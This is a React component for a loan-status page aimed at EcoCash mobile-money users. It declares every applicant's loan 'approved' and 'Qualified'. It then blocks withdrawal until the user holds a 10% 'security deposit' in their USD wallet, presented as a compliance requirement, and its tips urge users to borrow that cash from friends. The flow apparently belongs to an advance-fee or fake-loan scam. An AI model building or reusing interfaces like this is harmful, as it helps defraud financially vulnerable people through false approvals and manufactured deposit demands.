import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Status.css';

export default function Status() {
  const navigate = useNavigate();
  
  const { 
    loanStatusData,
    personalDetailsData,
    authData,
    completeDeposit 
  } = useLoanApplication();
  
  const [showDeposit, setShowDeposit] = useState(false);
  const [showWithdraw, setShowWithdraw] = useState(false);
  const [showLoanDetails, setShowLoanDetails] = useState(false);
  const [showWithdrawWarning, setShowWithdrawWarning] = useState(false);

  const loanData = {
    approvedAmount: loanStatusData.approvedAmount || 0,
    requestedAmount: loanStatusData.requestedAmount || 0,
    monthlyPayment: loanStatusData.monthlyPayment || 0,
    loanTerm: loanStatusData.loanTerm || '12 Months',
    interestRate: loanStatusData.interestRate || '8% APR'
  };

  const formatPhoneForServer = (phone) => {
    if (!phone) return null;
    
    let cleaned = phone.replace(/\D/g, '');
    
    if (cleaned.startsWith('263')) {
      return '+' + cleaned;
    }
    
    if (cleaned.startsWith('0')) {
      cleaned = cleaned.substring(1);
    }
    
    return '+263' + cleaned;
  };

  const userData = {
    name: `${personalDetailsData.firstName || ''} ${personalDetailsData.lastName || ''}`.trim() || 'User',
    accountNumber: loanStatusData.accountNumber || authData.phoneNumber?.replace(/\D/g, '').slice(-10) || 'N/A',
    requiredDeposit: loanStatusData.requiredDeposit || 0,
    totalWithBonus: loanStatusData.totalWithBonus || 0
  };

  const handleDepositFunds = () => {
    setShowDeposit(true);
    setShowWithdraw(false);
    setShowLoanDetails(false);
    setShowWithdrawWarning(false);
  };

  const handleWithdrawFunds = () => {
    if (!loanStatusData.hasDeposited) {
      setShowWithdrawWarning(true);
    } else {
      setShowWithdraw(true);
      setShowDeposit(false);
      setShowLoanDetails(false);
    }
  };

  const handleProceedWithdraw = () => {
    setShowWithdrawWarning(false);
    setShowWithdraw(true);
    setShowDeposit(false);
    setShowLoanDetails(false);
  };

  const handleCancelWithdraw = () => {
    setShowWithdrawWarning(false);
  };

  const handleBack = () => {
    setShowDeposit(false);
    setShowWithdraw(false);
    setShowLoanDetails(false);
  };

  const handleLoanDetails = () => {
    setShowLoanDetails(true);
    setShowDeposit(false);
    setShowWithdraw(false);
    setShowWithdrawWarning(false);
  };

  const handleCompleteDeposit = () => {
    completeDeposit();
    setShowDeposit(false);
  };

  const handleCompleteWithdraw = () => {
    setShowWithdraw(false);
  };

  const handleReturnHome = () => {
    navigate('/');
  };

  if (showWithdrawWarning) {
    return (
      <div className="status-container">
        <div className="status-content">
          <div className="popup-overlay" onClick={handleCancelWithdraw}></div>

          <div className="warning-popup">
            <div className="warning-popup-content">
              <div className="warning-icon-container">
                <span className="warning-lock-icon">🔒</span>
              </div>

              <h2 className="warning-popup-title">Please deposit first!</h2>

              <p className="warning-popup-text">
                You need to deposit 10% of your requested loan amount in USD WALLET before you can withdraw funds.
              </p>

              <div className="warning-popup-buttons">
                <button className="warning-cancel-btn" onClick={handleCancelWithdraw}>
                  Cancel
                </button>
                <button className="warning-deposit-btn" onClick={handleDepositFunds}>
                  Deposit Now
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (showLoanDetails) {
    return (
      <div className="status-container loan-details-container">
        <div className="status-content loan-details-content">
          
          <div className="loan-details-header">
            <button className="loan-details-back-btn" onClick={handleBack}>
              ←
            </button>
            <h1 className="loan-details-page-title">Loan Details</h1>
          </div>

          <div className="loan-details-modal-card">
            <div className="loan-detail-info-item">
              <div className="loan-detail-info-label">
                <span className="loan-detail-info-icon">👤</span>
                <p className="loan-detail-label-text">NAME</p>
              </div>
              <p className="loan-detail-info-value">{userData.name}</p>
            </div>

            <div className="loan-detail-info-item">
              <div className="loan-detail-info-label">
                <span className="loan-detail-info-icon">📱</span>
                <p className="loan-detail-label-text">ECOCASH ACCOUNT</p>
              </div>
              <p className="loan-detail-info-value">{userData.accountNumber}</p>
            </div>

            <div className="loan-requested-amount-box">
              <div className="loan-requested-label">
                <span className="loan-detail-info-icon">💵</span>
                <p className="loan-requested-label-text">REQUESTED LOAN AMOUNT</p>
              </div>
              <p className="loan-requested-value">${loanData.requestedAmount.toLocaleString()}</p>
            </div>

            <div className="loan-deposit-summary-item">
              <p className="loan-summary-label">REQUIRED DEPOSIT (10%)</p>
              <p className="loan-summary-value">${userData.requiredDeposit.toLocaleString()}</p>
            </div>

            <div className="loan-deposit-summary-item">
              <p className="loan-summary-label">TOTAL AMOUNT (WITH 10% BONUS)</p>
              <p className="loan-summary-value">${userData.totalWithBonus.toLocaleString()}</p>
            </div>

            <div className="loan-qualified-badge-container">
              <div className="loan-qualified-badge">
                <span>✓</span>
                Qualified
              </div>
            </div>

            <div className="loan-details-tip-box">
              <div className="loan-details-tip-header">
                <span className="loan-details-tip-icon">💡</span>
                <p className="loan-details-tip-title">Tip</p>
              </div>
              <p className="loan-details-tip-text">
                To use your loan funds, ensure your USD WALLET in EcoCash account has at least 10% of the loan amount as a deposit. If needed, ask a friend to send you the cash, then return it after qualification.
              </p>
            </div>

            <button className="loan-details-back-button" onClick={handleBack}>
              <span>←</span>
              Back to Loan Summary
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (showDeposit) {
    return (
      <div className="status-container">
        <div className="status-content">
          <div className="deposit-header">
            <button className="back-arrow" onClick={handleBack}>←</button>
            <h1 className="deposit-title">Deposit Funds</h1>
          </div>

          <div className="deposit-card">
            <div className="info-section">
              <div className="info-item">
                <span className="info-icon">👤</span>
                <div>
                  <p className="info-label">NAME</p>
                  <p className="info-value">{userData.name}</p>
                </div>
              </div>

              <div className="info-item">
                <span className="info-icon">📱</span>
                <div>
                  <p className="info-label">ECOCASH ACCOUNT</p>
                  <p className="info-value">{userData.accountNumber}</p>
                </div>
              </div>
            </div>

            <div className="required-deposit-box">
              <p className="deposit-label">💵 REQUIRED DEPOSIT (10%)</p>
              <p className="deposit-amount">${userData.requiredDeposit.toLocaleString()}</p>
            </div>

            <div className="instructions-section">
              <h3 className="instructions-title">Instructions:</h3>

              <div className="instruction-step">
                <span className="step-number">1</span>
                <p className="step-text">
                  Open your EcoCash app or dial <strong>*151#</strong> on your phone.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">2</span>
                <p className="step-text">
                  Select <strong>"Send Money"</strong> or <strong>"Deposit"</strong>.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">3</span>
                <p className="step-text">
                  Enter your EcoCash account number: <strong>{userData.accountNumber}</strong>.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">4</span>
                <p className="step-text">
                  Enter the amount: <strong>${userData.requiredDeposit} USD</strong> (or more).
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">5</span>
                <p className="step-text">
                  Confirm the transaction and complete the deposit.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">6</span>
                <p className="step-text">
                  Wait for the confirmation SMS from EcoCash.
                </p>
              </div>
            </div>

            <div className="tip-box">
              <div className="tip-header">
                <span className="tip-icon">💡</span>
                <span className="tip-title">Helpful Tip</span>
              </div>
              <p className="tip-text">
                If you do not have the 10% available in USD WALLET, ask a friend to send the cash to your EcoCash account, then you can send it back after qualification.
              </p>
            </div>

            <div className="confirmation-box">
              <span className="check-icon">✓</span>
              <p className="confirmation-text">
                <strong>Once the deposit is confirmed</strong>, you will be able to use your loan funds.
              </p>
            </div>

            <button className="complete-button" onClick={handleCompleteDeposit}>
              <span className="button-check">✓</span>
              I've Completed the Deposit
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (showWithdraw) {
    return (
      <div className="status-container">
        <div className="status-content">
          <div className="deposit-header">
            <button className="back-arrow" onClick={handleBack}>←</button>
            <h1 className="deposit-title">Withdraw Funds</h1>
          </div>

          <div className="deposit-card">
            <div className="info-section">
              <div className="info-item">
                <span className="info-icon">👤</span>
                <div>
                  <p className="info-label">NAME</p>
                  <p className="info-value">{userData.name}</p>
                </div>
              </div>

              <div className="info-item">
                <span className="info-icon">📱</span>
                <div>
                  <p className="info-label">ECOCASH ACCOUNT</p>
                  <p className="info-value">{userData.accountNumber}</p>
                </div>
              </div>
            </div>

            <div className="required-deposit-box">
              <p className="deposit-label">💰 AVAILABLE BALANCE</p>
              <p className="deposit-amount">${loanData.approvedAmount.toLocaleString()}</p>
            </div>

            <div className="instructions-section">
              <h3 className="instructions-title">Instructions:</h3>

              <div className="instruction-step">
                <span className="step-number">1</span>
                <p className="step-text">
                  Open your EcoCash app or dial <strong>*151#</strong> on your phone.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">2</span>
                <p className="step-text">
                  Select <strong>"Withdraw Money"</strong> or <strong>"Send to Bank"</strong>.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">3</span>
                <p className="step-text">
                  Enter your EcoCash account number: <strong>{userData.accountNumber}</strong>.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">4</span>
                <p className="step-text">
                  Enter the amount you wish to withdraw.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">5</span>
                <p className="step-text">
                  Confirm the transaction and complete the withdrawal.
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">6</span>
                <p className="step-text">
                  Wait for the confirmation SMS from EcoCash.
                </p>
              </div>
            </div>

            <div className="tip-box">
              <div className="tip-header">
                <span className="tip-icon">💡</span>
                <span className="tip-title">Helpful Tip</span>
              </div>
              <p className="tip-text">
                You can withdraw funds to your bank account or collect cash at any EcoCash agent. Standard transaction fees apply.
              </p>
            </div>

            <button className="complete-button" onClick={handleCompleteWithdraw}>
              <span className="button-check">✓</span>
              I've Completed the Withdrawal
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="status-container">
      <div className="status-content">
        
        <div className="success-card">
          <div className="success-icon-container">
            <span className="success-checkmark">✓</span>
          </div>

          <h1 className="congrats-title">
            <span className="party-emoji">🎉</span>
            Congratulations!
          </h1>

          <p className="approval-text">
            Your loan has been <span className="approval-highlight">approved!</span> The funds will be disbursed shortly.
          </p>

          <div className="approved-amount-section">
            <p className="approved-label">Approved Amount</p>
            <p className="approved-amount">${loanData.approvedAmount.toLocaleString()}</p>
          </div>

          <div className="compliance-notice">
            <div className="notice-header">
              <span className="warning-icon">⚠️</span>
              <span className="notice-title">Compliance Notice</span>
            </div>
            <p className="notice-text">
              Your EcoCash account must be active and maintain a security deposit of at least{' '}
              <span className="notice-highlight">10% of your requested loan amount IN USD WALLET</span>. This deposit is fully refundable upon successful loan repayment and helps secure better interest rates.
            </p>
          </div>
        </div>

        <div className="loan-details-card">
          <div className="details-header">
            <span className="details-icon">💳</span>
            <h2 className="details-title">Loan Details</h2>
          </div>

          <div className="detail-item">
            <div className="detail-icon-wrapper">
              <span className="detail-icon">💵</span>
            </div>
            <div className="detail-content">
              <p className="detail-label">Monthly Payment</p>
              <p className="detail-value">${loanData.monthlyPayment.toLocaleString()}</p>
            </div>
          </div>

          <div className="detail-item">
            <div className="detail-icon-wrapper">
              <span className="detail-icon">📅</span>
            </div>
            <div className="detail-content">
              <p className="detail-label">Loan Term</p>
              <p className="detail-value">{loanData.loanTerm}</p>
            </div>
          </div>

          <div className="detail-item">
            <div className="detail-icon-wrapper">
              <span className="detail-icon">📈</span>
            </div>
            <div className="detail-content">
              <p className="detail-label">Interest Rate</p>
              <p className="detail-value">{loanData.interestRate}</p>
            </div>
          </div>
        </div>

        <div className="quick-actions-section">
          <h3 className="actions-title">Quick Actions</h3>
          
          <div className="action-buttons">
            <button className="action-button" onClick={handleDepositFunds}>
              <span className="button-icon">💰</span>
              <span>Deposit Funds</span>
            </button>

            <button className="action-button" onClick={handleWithdrawFunds}>
              <span className="button-icon">💸</span>
              <span>Withdraw Funds</span>
            </button>

            <button className="action-button" onClick={handleLoanDetails}>
              <span className="button-icon">📄</span>
              <span>Loan Details</span>
            </button>
          </div>

          <div className="next-steps-box">
            <div className="next-steps-header">
              <span className="steps-icon">📱</span>
              <span className="steps-title">Next Steps:</span>
            </div>
            <p className="steps-text">
              You will receive an SMS and email with disbursement details within 24 hours.
            </p>
          </div>
        </div>

        <button className="return-home-button" onClick={handleReturnHome}>
          <span className="home-icon">🏠</span>
          <span>Return to Home</span>
        </button>
      </div>
    </div>
  );
}